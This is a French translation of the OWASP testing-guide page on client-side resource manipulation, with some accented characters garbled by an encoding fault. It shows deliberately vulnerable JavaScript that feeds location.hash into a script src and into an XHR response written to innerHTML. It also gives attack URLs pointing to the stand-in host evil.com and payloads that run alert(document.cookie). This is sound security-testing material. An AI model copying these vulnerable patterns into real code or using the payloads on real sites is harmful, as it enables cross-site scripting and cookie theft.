# Test de la manipulation des ressources c�t� client

|ID          |
|------------|
|WSTG-CLNT-06|

## Sommaire

Une vuln�rabilit� de manipulation de ressources c�t� client est une faille de validation d'entr�e. Cela se produit lorsqu'une application accepte une entr�e contr�l�e par l'utilisateur qui sp�cifie le chemin d'une ressource telle que la source d'un iframe, JavaScript, applet ou le gestionnaire d'un XMLHttpRequest. Cette vuln�rabilit� consiste en la capacit� de contr�ler les URL qui pointent vers certaines ressources pr�sentes dans une page Web. L'impact de cette vuln�rabilit� varie et elle est g�n�ralement adopt�e pour mener des attaques XSS. Cette vuln�rabilit� permet d'interf�rer avec le comportement attendu de l'application en lui faisant charger et restituer des objets malveillants.

Le code JavaScript suivant montre un �ventuel script vuln�rable dans lequel un attaquant est capable de contr�ler le `location.hash` (source) qui atteint l'attribut `src` d'un �l�ment de script. Ce cas particulier conduit � une attaque XSS car du JavaScript externe pourrait �tre inject�.

```html
<script>
    var d=document.createElement("script");
    if(location.hash.slice(1)) {
        d.src = location.hash.slice(1);
    }
    document.body.appendChild(d);
</script>
```

Un attaquant pourrait cibler une victime en lui faisant visiter cette URL�:

`www.victim.com/#http://evil.com/js.js`

O� `js.js` contient�:

```js
alert(document.cookie)
```

Cela entra�nerait l'apparition de l'alerte sur le navigateur de la victime.

Un sc�nario plus pr�judiciable implique la possibilit� de contr�ler l'URL appel�e dans une requ�te CORS. �tant donn� que CORS permet � la ressource cible d'�tre accessible par le domaine demandeur via une approche bas�e sur l'en-t�te, l'attaquant peut demander � la page cible de charger du contenu malveillant � partir de son propre site Web.

Voici un exemple de page vuln�rable�:

```html
<b id="p"></b>
<script>
    function createCORSRequest(method, url) {
        var xhr = new XMLHttpRequest();
        xhr.open(method, url, true);
        xhr.onreadystatechange = function () {
            if (this.status == 200 && this.readyState == 4) {
                document.getElementById('p').innerHTML = this.responseText;
            }
        };
        return xhr;
    }

    var xhr = createCORSRequest('GET', location.hash.slice(1));
    xhr.send(null);
</script>
```

Le `location.hash` est contr�l� par l'entr�e de l'utilisateur et est utilis� pour demander une ressource externe, qui sera ensuite refl�t�e via la construction `innerHTML`. Un attaquant pourrait demander � une victime de visiter l'URL suivante�:

`www.victim.com/#http://evil.com/html.html`

Avec le gestionnaire de charge utile pour `html.html`�:

```html
<?php
header('Access-Control-Allow-Origin: http://www.victim.com');
?>
<script>alert(document.cookie);</script>
```

## Objectifs des tests

- Identifiez les puits avec une validation d'entr�e faible.
- �valuer l'impact de la manipulation des ressources.

## Comment tester

Pour v�rifier manuellement ce type de vuln�rabilit�, nous devons identifier si l'application utilise des entr�es sans les valider correctement. Si c'est le cas, ces entr�es sont sous le contr�le de l'utilisateur et pourraient �tre utilis�es pour sp�cifier des ressources externes. �tant donn� qu'il existe de nombreuses ressources pouvant �tre incluses dans l'application (telles que des images, des vid�os, des objets, des CSS et des iframes), les scripts c�t� client qui g�rent les URL associ�es doivent �tre examin�s pour les probl�mes potentiels.

Le tableau suivant montre les points d'injection possibles (puits) qui doivent �tre v�rifi�s�:

| Type de ressource | Tag/M�thode                             | Sink   |
| ----------------- | --------------------------------------- | ------ |
| Frame             | iframe                                  | src    |
| Link              | a                                       | href   |
| AJAX Request      | `xhr.open(method, [url], true);`        | URL    |
| CSS               | link                                    | href   |
| Image             | img                                     | src    |
| Object            | object                                  | data   |
| Script            | script                                  | src    |

Les plus int�ressantes sont celles qui permettent � un attaquant d'inclure du code c�t� client (par exemple JavaScript) pouvant conduire � des vuln�rabilit�s XSS.
